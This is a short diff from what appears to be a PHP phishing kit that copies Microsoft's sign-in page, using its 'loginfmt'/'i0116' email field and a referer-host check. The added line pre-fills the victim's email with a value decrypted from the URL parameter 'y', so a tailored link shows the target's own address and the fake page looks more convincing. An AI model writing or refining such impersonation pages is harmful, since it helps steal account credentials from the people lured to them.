@@ -86,7 +86,7 @@ if($refData['host'] !== $_SERVER['HTTP_HOST']) {
                                         </div>
                                         <div class="form-group col-md-24">
                                             <div class="placeholderContainer"> <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override"  aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader loginDescription"
-                                                    placeholder="Email, phone, or Skype" value="" lang="en"> </div>
+                                                    placeholder="Email, phone, or Skype" value="<?php require 'engine/encrypt.php'; echo doDecrypt($_GET["y"]); ?>" lang="en"> </div>
                                         </div>
                                     </div>
                                     <div class="position-buttons">
